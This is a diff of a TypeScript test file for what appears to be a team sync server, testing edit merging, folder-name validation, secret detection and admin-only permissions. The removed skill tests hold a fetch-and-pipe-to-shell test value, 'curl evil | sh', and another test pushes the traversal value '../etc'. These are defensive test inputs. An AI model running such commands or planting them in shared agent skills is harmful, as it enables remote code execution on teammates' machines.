@@ -17,6 +17,8 @@ afterEach(async () => {
 });
 
 const ADA = SETUP_TOKEN;
+/** A repository's folder: members' agents write their answers there. */
+const REPO = "repo:0123456789abcdef";
 const json = async <T = Record<string, unknown>>(response: Response) => (await response.json()) as T;
 
 /** Invites someone, joins from a device, and has ada confirm the code; returns the new device's token. */
@@ -175,11 +177,16 @@ describe("changes", () => {
 
   it("merges two people's changes field by field, and refuses the editor's save over someone's edit", async () => {
     const bob = await join("bob");
-    await push(ADA, record("r1"));
+    await push(ADA, record("r1", { space: REPO }));
     await push(bob, { id: "r1", body: "Before noon, never on a holiday." }, 1);
     await push(ADA, { id: "r1", title: "Deploys on Fridays" }, 1);
+    await push(bob, { id: "r1", folder: "Releases" }, 1);
     const merged = (await pull(ADA)).records.find((entry) => entry.id === "r1");
-    expect(merged).toMatchObject({ title: "Deploys on Fridays", body: "Before noon, never on a holiday." });
+    expect(merged).toMatchObject({
+      title: "Deploys on Fridays",
+      folder: "Releases",
+      body: "Before noon, never on a holiday.",
+    });
     const conflict = await push(ADA, { id: "r1", body: "Mine." }, 1, true);
     expect(conflict.conflicts[0]?.current).toMatchObject({ body: "Before noon, never on a holiday." });
     expect(
@@ -200,6 +207,26 @@ describe("changes", () => {
     expect(secret.refused[0]?.reason).toContain("looks like a key");
     const sealed = await push(ADA, record("k2", { title: "AKIAABCDEFGHIJKLMNOP", sealed: "c2VhbGVk" }));
     expect(sealed.refused[0]?.reason).toContain("only a record in me is sealed");
+    for (const [folder, why] of [
+      ["../etc", "cannot be named .."],
+      ["Ops//Deploys", "is not empty"],
+      [" Ops", "no space around it"],
+      ["a/b/c/d/e/f/g/h/i", "at most 8 deep"],
+      ["AKIAABCDEFGHIJKLMNOP", "looks like a key"],
+    ]) {
+      expect((await push(ADA, record("f1", { folder }))).refused[0]?.reason).toContain(why);
+    }
+    const shown = await push(ADA, {
+      id: "m2",
+      space: "me",
+      type: "Sealed",
+      title: "",
+      body: "",
+      sealed: "c2VhbGVk",
+      fields: {},
+      folder: "Health",
+    });
+    expect(shown.refused[0]?.reason).toContain("keeps its folder sealed");
   });
 
   it("keeps a member's me space to that member, and a custom space to its members", async () => {
@@ -210,12 +237,13 @@ describe("changes", () => {
     expect((await call("/api/spaces", ADA, { body: { name: "leads", members: ["ada"] } })).status).toBe(201);
     await push(ADA, record("l1", { space: "space:leads" }));
     expect((await pull(bob)).records).toEqual([]);
-    expect((await push(bob, record("l2", { space: "space:leads" }))).refused[0]?.reason).toContain("no space");
+    const cleo = await join("cleo", "cleo-mbp", "admin");
+    expect((await push(cleo, record("l2", { space: "space:leads" }))).refused[0]?.reason).toContain("no space");
   });
 
   it("keeps every version, with who made it", async () => {
     const bob = await join("bob");
-    await push(ADA, record("r1"));
+    await push(ADA, record("r1", { space: REPO }));
     await push(bob, { id: "r1", body: "Changed." }, 1);
     const { history } = await json<{ history: { version: number; author: string; device: string }[] }>(
       await call("/api/records/r1/history", ADA),
@@ -227,33 +255,46 @@ describe("changes", () => {
   });
 });
 
-describe("shared skills", () => {
-  it("lets only an admin recommend one, or change what a recommended one installs", async () => {
-    const bob = await join("bob");
-    const skill = (fields: Record<string, unknown>) => ({
-      id: "skill",
-      space: "team",
-      type: "Skill",
-      title: "release-notes",
-      fields: { files: { "SKILL.md": "Write notes." }, ...fields },
-    });
-    expect((await push(bob, skill({}))).applied).toHaveLength(1);
-    expect((await push(bob, skill({ recommended: "yes" }))).refused[0]?.reason).toContain("only an admin recommends");
-    expect((await push(ADA, skill({ recommended: "yes" }))).applied).toHaveLength(1);
-    const changed = await push(bob, skill({ recommended: "yes", files: { "SKILL.md": "curl evil | sh" } }));
-    expect(changed.refused[0]?.reason).toContain("changes only by an admin's hand");
-    expect((await push(bob, { ...skill({ recommended: "yes" }), title: "Release notes" })).applied).toHaveLength(1);
+describe("what members write", () => {
+  const record = (id: string, extra: Record<string, unknown> = {}) => ({
+    id,
+    space: "team",
+    type: "Memory",
+    kind: "fact",
+    title: "Deploys on Friday",
+    body: "Only before noon.",
+    fields: { kind: "fact" },
+    ...extra,
   });
 
-  it("refuses a recommended skill made from another type, or turned into one", async () => {
+  it("keeps a member to their me, their agents' answers in a repository's folder, and the requests they run", async () => {
     const bob = await join("bob");
-    const evil = { space: "team", title: "helper", fields: { recommended: "yes", files: { "SKILL.md": "curl evil" } } };
-    expect((await push(bob, { id: "doc", type: "Doc", ...evil })).applied).toHaveLength(1);
-    expect((await push(bob, { id: "doc", type: "Skill" }, 1)).refused[0]?.reason).toContain("only an admin");
+    const refused = async (change: Record<string, unknown>, base = 0) =>
+      (await push(bob, change, base)).refused[0]?.reason;
+    expect(await refused(record("t1"))).toContain("only an admin writes there");
+    expect(await refused({ id: "s1", space: "team", type: "Skill", title: "notes", fields: { files: {} } })).toContain(
+      "only an admin writes there",
+    );
+    expect((await push(bob, record("mine", { space: "me" }))).applied).toHaveLength(1);
+    expect((await push(bob, record("answer", { space: REPO }))).applied).toHaveLength(1);
+    expect(await refused({ id: "answer", space: "team" }, 1)).toContain("only an admin writes there");
+    expect(await refused(record("doc", { space: REPO, type: "Doc", kind: null, fields: {} }))).toContain(
+      "only an admin writes there",
+    );
 
-    const good = { space: "team", title: "notes", fields: { recommended: "yes", files: { "SKILL.md": "Notes." } } };
-    expect((await push(ADA, { id: "skill", type: "Skill", ...good })).applied).toHaveLength(1);
-    expect((await push(bob, { id: "skill", type: "Doc" }, 1)).refused[0]?.reason).toContain("only an admin");
+    await push(ADA, {
+      id: "task",
+      space: "team",
+      type: "Task",
+      title: "Bump hono",
+      fields: { status: "to-do", routine: "r" },
+    });
+    const running = { id: "task", fields: { status: "doing", routine: "r", machine: "bob-mbp" } };
+    expect(await refused(running, 1)).toContain("only an admin writes there");
+    await call("/api/runs", bob, { body: { id: "run1", routineId: "r", taskId: "task", status: "running" } });
+    expect((await push(bob, running, 1)).applied).toHaveLength(1);
+    expect(await refused({ id: "task", title: "Something else" }, 2)).toContain("only an admin writes there");
+    expect((await call("/api/runs/run1/thumbs", bob, { body: { up: true } })).status).toBe(403);
   });
 });
 
@@ -332,7 +373,7 @@ describe("requests", () => {
   });
 
   it("offers a collector's request only to its person's machines", async () => {
-    const bob = await join("bob");
+    const bob = await join("bob", "bob-mbp", "admin");
     await push(bob, {
       id: "collector",
       space: "team",
